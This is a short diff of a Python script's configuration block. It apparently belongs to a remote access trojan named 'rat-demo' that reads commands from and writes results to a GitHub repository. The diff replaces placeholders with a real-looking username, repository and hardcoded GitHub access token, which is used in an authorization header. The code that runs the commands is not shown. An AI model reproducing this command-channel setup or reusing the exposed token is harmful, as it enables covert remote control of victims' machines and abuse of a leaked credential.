@@ -9,14 +9,14 @@ import shutil
 import base64
 
 # ---------------- CONFIGURATION ----------------
-GITHUB_USER = "your_github_name"
-REPO_NAME = "your_repo_name"
+GITHUB_USER = "coderkitty-cell"
+REPO_NAME = "rat-demo"
 COMMAND_FILE = "commands.txt"
 RESULT_FILE = "result.txt"
 BRANCH = "main"
 
 # ---------------- GitHub token ----------------
-TOKEN = "replace_your_github_token"
+TOKEN = "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"
 
 HEADERS = {"Authorization": f"token {TOKEN}"}
 
